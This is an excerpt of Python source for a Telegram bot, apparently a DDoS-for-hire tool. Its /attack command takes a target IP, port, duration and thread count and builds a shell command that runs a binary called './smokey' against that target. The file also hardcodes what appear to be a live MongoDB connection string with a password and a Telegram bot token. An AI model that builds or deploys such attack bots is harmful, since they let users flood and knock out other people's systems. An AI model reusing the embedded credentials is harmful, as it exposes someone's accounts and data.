...
MONGO_URI = 'mongodb+srv://Magic:Spike@cluster0.fa68l.mongodb.net/smokey?retryWrites=true&w=majority&appName=Cluster0'
...
# Bot Configuration
TELEGRAM_BOT_TOKEN = '7544620080:AAEJicPM7TCWZw4FIpSuYTfTR2kjA09oLLA'
ADMIN_USER_ID = 6644586902
ADMIN_USER_ID = 6644586902
...
async def start(update: Update, context: CallbackContext):
    ...
    message = (
        ...
        "*Let the war begin! ⚔️💥 MADE BY @PATHANSTOREX*"
    )
...
async def attack(update: Update, context: CallbackContext):
    ...
    args = context.args
    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /attack <ip> <port> <duration>* MADE BY @PATHANSTOREX", parse_mode='Markdown')
        return
    ...
    if argument_type == 3:
        attack_command = f"./smokey {ip} {port} {duration} "
    elif argument_type == 4:
        attack_command = f"./smokey {ip} {port} {duration} {threads} "
    elif argument_type == 5:
        attack_command = f"./smokey {ip} {port} {duration} {byte_size} {threads} "
